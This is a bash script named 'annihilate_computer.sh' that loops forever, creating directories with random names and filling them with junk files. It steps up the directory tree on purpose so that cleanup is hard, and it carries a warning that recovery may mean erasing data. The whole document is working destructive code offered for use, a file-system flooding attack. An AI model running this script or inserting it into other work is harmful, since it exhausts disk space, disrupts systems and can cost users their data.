#!/bin/bash -       
#title           :annihilate_computer.sh
#description     :This script will endlessly create garbage files and slowly move up the directory in order to make cleanup difficult
#author		 :Kasimir Schulz
#date            :20181129
#version         :1.0
#usage		 :bash annihilate_computer.sh
#notes           :Do not use unless you are willing to either spend a lot of time cleaning up files or are willing to erase all the data in the affected directories.
#====================================================================================================================================================================

file=0
dir=sorry
line=$RANDOM
path=./
addition=.
s=abcdefghijklmnopqrstuvxwyz
check=0

# The number of files per directory
numoffiles=10
# The number of files created before going up a directory
numbeforeup=5


while true 
do
    if [ $file -gt $numbeforeup ]
    then
        if [ $check = 0 ]
        then
            path=$addition$path
            let check=1
        fi

    fi
    mkdir $path$dir 
    for ((o=0; o<=numoffiles; o++))
    do
        echo $line >> $path$dir/$file
        let line=$line$RANDOM
        let file+=1
    done
    range=$(( ( RANDOM % 10 )  + 1 ))
    constant=''
    for ((i=0; i<=range; i++))
    do
        p=$(( $RANDOM % 26)) 
        constant=$constant${s:$p:1}
    done
    dir=$constant
done